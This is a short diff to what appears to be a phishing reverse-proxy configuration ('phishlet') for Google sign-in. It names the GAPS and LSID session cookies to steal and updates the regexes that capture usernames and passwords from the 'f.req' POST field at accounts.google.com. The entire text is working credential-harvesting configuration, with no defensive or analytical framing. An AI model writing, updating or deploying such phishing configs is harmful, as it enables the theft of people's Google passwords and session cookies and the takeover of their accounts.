@@ -16,14 +16,14 @@ auth_tokens:
     keys: ['GAPS', 'LSID']	
 credentials:
   username:
-    key: '(login|Email)'
-    search: '(.*)'
+    key: 'f.req'
+    search: '\[*\[\"(.+?)\"'
     type: 'post'
   password:
-    key: '(passwd|Passwd)'
-    search: '(.*)'
+    key: 'f.req'
+    search: '\[.*\[\"(.+?)\"'
     type: 'post'
 login:
   domain: 'accounts.google.com'
   path: '/signin/v2/identifier'
-  path: '/ServiceLogin'
+  path: '/ServiceLogin/identifier'
